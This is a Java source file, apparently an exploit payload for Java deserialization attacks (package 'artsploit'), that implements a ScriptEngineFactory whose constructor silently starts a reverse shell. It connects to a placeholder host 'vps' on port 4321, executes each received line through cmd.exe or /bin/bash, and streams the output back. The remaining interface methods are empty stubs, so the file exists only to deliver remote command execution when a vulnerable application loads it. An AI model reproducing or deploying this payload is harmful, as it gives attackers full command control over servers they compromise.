package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;
import java.io.*;
import java.net.Socket;
import java.util.Base64;



public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        new Thread(() -> {
            try {
                Socket socket = new Socket("vps",4321);
                BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
                bufferedWriter.write("connect success!\r\n");
                bufferedWriter.flush();

                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));

                Process pro;

                while (true) {
                    String line;
                    while ((line = bufferedReader.readLine()) == null)
                        ;
                    if(System.getProperty("os.name").toLowerCase().startsWith("win")){
                        pro = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", line});
                    }else{
                        pro = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", line});
                    }

                    BufferedReader read = new BufferedReader(new InputStreamReader(pro.getInputStream()));

                    String line2;
                    while ((line2 = read.readLine()) != null) {
                        bufferedWriter.write(line2+"\r\n");
                        bufferedWriter.flush();
                    }
                }

            } catch (IOException e) {
                e.printStackTrace();
            }
        }).start();
    }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}
